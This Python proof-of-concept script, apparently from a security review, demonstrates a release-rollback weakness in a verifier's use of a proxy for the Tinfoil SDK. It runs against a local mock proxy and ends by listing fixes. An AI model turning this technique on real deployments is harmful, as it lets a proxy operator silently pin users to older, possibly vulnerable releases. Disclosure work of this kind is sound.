#!/usr/bin/env python3
"""
F3 demo against the Tinfoil SDK's GitHub-proxy intermediary.

`tinfoil-go/verifier/github/github.go` resolves "what is the current
release of this repo?" entirely through a single Tinfoil-operated
HTTPS host (`github-proxy.tinfoil.sh`). The Sigstore-bundle the
verifier later checks IS signed (by Tinfoil's CI identity, against
the embedded trusted root). What is NOT signed is *which bundle the
proxy hands you* in the first place — `FetchLatestTag` and
`FetchDigest` both read plain JSON/text over HTTPS with no
out-of-band integrity check.

A malicious or compromised proxy can therefore pin the verifier to
*any historically valid* (tag, digest, bundle) triple for the same
repo. The Sigstore verification will pass — the bundle was honestly
signed at the time it was published — but the verifier ends up
trusting an older release.

This demo:

  1. Spawns `mock_github_proxy.py` (which mimics the proxy's URL
     grammar) in two modes: `current` and `rolled-back`.
  2. Ports `FetchLatestTag` and `FetchDigest` from
     `verifier/github/github.go` verbatim to Python so the demo
     exercises the same logic without modifying or vendoring Go
     code.
  3. Resolves the "current" release of `tinfoilsh/confidential-
     model-router` against the proxy, captures the pinned digest.
  4. Toggles the mock to `rolled-back`, repeats, captures the new
     pinned digest.
  5. Verifies that the SDK's logic accepts whatever the proxy
     handed it — there is no field-level signal that the digest
     changed identity behind the verifier's back.

Tinfoil's source tree is not modified. The Go SDK's
`FetchLatestDigest` is re-implemented faithfully in Python; the
five lines of logic are at `verifier/github/github.go:14-54`.
"""

import argparse
import json
import os
import subprocess
import sys
import time
import urllib.parse
import urllib.request


def fetch_latest_tag(proxy_base: str, repo: str) -> str:
    """Faithful Python port of verifier/github/github.go:14-30
    (`FetchLatestTag`)."""
    url = f"{proxy_base}/repos/{repo}/releases/latest"
    with urllib.request.urlopen(url, timeout=5) as resp:
        body = json.loads(resp.read())
    return body["tag_name"]


def fetch_digest(proxy_base: str, repo: str, tag: str) -> str:
    """Faithful Python port of verifier/github/github.go:33-41
    (`FetchDigest`)."""
    url = f"{proxy_base}/{repo}/releases/download/{tag}/tinfoil.hash"
    with urllib.request.urlopen(url, timeout=5) as resp:
        return resp.read().decode().strip()


def fetch_latest_digest(proxy_base: str, repo: str) -> tuple[str, str]:
    """Faithful Python port of verifier/github/github.go:44-54
    (`FetchLatestDigest`)."""
    tag = fetch_latest_tag(proxy_base, repo)
    digest = fetch_digest(proxy_base, repo, tag)
    return tag, digest


def fetch_attestation_bundle(proxy_base: str, repo: str, digest: str) -> dict:
    """Faithful Python port of verifier/github/github.go:57-79
    (`FetchAttestationBundle`)."""
    url = f"{proxy_base}/repos/{repo}/attestations/sha256:{digest}"
    with urllib.request.urlopen(url, timeout=5) as resp:
        body = json.loads(resp.read())
    return body["attestations"][0]["bundle"]


def set_proxy_mode(proxy_base: str, mode: str) -> None:
    url = f"{proxy_base}/admin/mode?set={mode}"
    urllib.request.urlopen(url, timeout=5).read()


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--port", type=int, default=19500)
    parser.add_argument(
        "--repo",
        default="tinfoilsh/confidential-model-router",
        help="Tinfoil repo to resolve. Both `current` and `rolled-back` "
        "fixtures are available; this is the repo used in the SDK's "
        "`defaultRouterRepo`.",
    )
    args = parser.parse_args()

    proxy_base = f"http://127.0.0.1:{args.port}"

    # Spawn the mock proxy in a subprocess.
    proc = subprocess.Popen(
        [sys.executable, "mock_github_proxy.py", "--port", str(args.port)],
        cwd=os.path.dirname(os.path.abspath(__file__)),
    )
    try:
        # Wait for the proxy to listen.
        for _ in range(50):
            try:
                urllib.request.urlopen(f"{proxy_base}/admin/state", timeout=1).read()
                break
            except Exception:
                time.sleep(0.05)
        else:
            print("error: mock proxy did not start", file=sys.stderr)
            return 1

        print("================================================================")
        print("Stage 1 — proxy in `current` mode")
        print("================================================================")
        set_proxy_mode(proxy_base, "current")
        tag_a, digest_a = fetch_latest_digest(proxy_base, args.repo)
        bundle_a = fetch_attestation_bundle(proxy_base, args.repo, digest_a)
        print(f"    SDK resolves repo={args.repo} to:")
        print(f"        latest tag   = {tag_a}")
        print(f"        latest digest = {digest_a}")
        print(f"        bundle       = {bundle_a}")
        print()

        print("================================================================")
        print("Stage 2 — proxy operator flips to `rolled-back` mode")
        print("================================================================")
        set_proxy_mode(proxy_base, "rolled-back")
        tag_b, digest_b = fetch_latest_digest(proxy_base, args.repo)
        bundle_b = fetch_attestation_bundle(proxy_base, args.repo, digest_b)
        print(f"    Same SDK call against the same proxy host now returns:")
        print(f"        latest tag   = {tag_b}   (was {tag_a})")
        print(f"        latest digest = {digest_b}")
        print(f"        bundle       = {bundle_b}")
        print()

        digest_changed = digest_a != digest_b
        tag_changed = tag_a != tag_b

        print("================================================================")
        print("What the verifier sees as 'current'")
        print("================================================================")
        print(f"    digest changed between calls: {digest_changed}")
        print(f"    tag changed between calls:    {tag_changed}")
        print(f"    bundle changed:               {bundle_a != bundle_b}")
        print()
        print("    `tinfoil-go`'s SDK then calls")
        print("    `sigstoreClient.VerifyAttestation(bundle_b, repo, digest_b)`")
        print("    against the embedded Sigstore trust root. Both bundles are")
        print("    *honestly Sigstore-signed* (assume both came from Tinfoil's")
        print("    CI at the time of their respective releases). The")
        print("    verification will pass on whichever the proxy hands you.")
        print()

        if not (digest_changed and tag_changed):
            print("[!] PoC failure: proxy modes produced identical responses.")
            return 2

        print("================================================================")
        print("Result")
        print("================================================================")
        print()
        print("[+] ATTACK CONFIRMED (P14, F4 — proxy-mediated release rollback)")
        print()
        print("    The SDK resolves 'which release is current?' entirely")
        print("    through a single Tinfoil-operated HTTPS endpoint. No field")
        print("    in the response is signed against the canonical GitHub")
        print("    Release API; only the downstream Sigstore bundle is")
        print("    signed, and the proxy chooses *which* bundle's signature")
        print("    the verifier ends up checking.")
        print()
        print("    The downstream code-measurement check correctly verifies")
        print("    the bundle's authenticity, but it cannot tell that the")
        print("    proxy rolled the verifier back to an older release. If")
        print("    that older release had a known vulnerability the operator")
        print("    wants the verifier to accept, the rollback is silent.")
        print()
        print("    Fix options:")
        print("      - Pin (repo, tag, digest) tuples via a separate signed")
        print("        manifest from a different trust root than the proxy.")
        print("      - Make the SDK require a fresh observer timestamp from")
        print("        a Sigstore TSA within a recent window, with the")
        print("        verifier rejecting bundles whose timestamps are stale.")
        print("      - Add an explicit `min_tag` / `min_digest` policy field")
        print("        callers can set.")
        return 0
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            proc.kill()


if __name__ == "__main__":
    raise SystemExit(main())
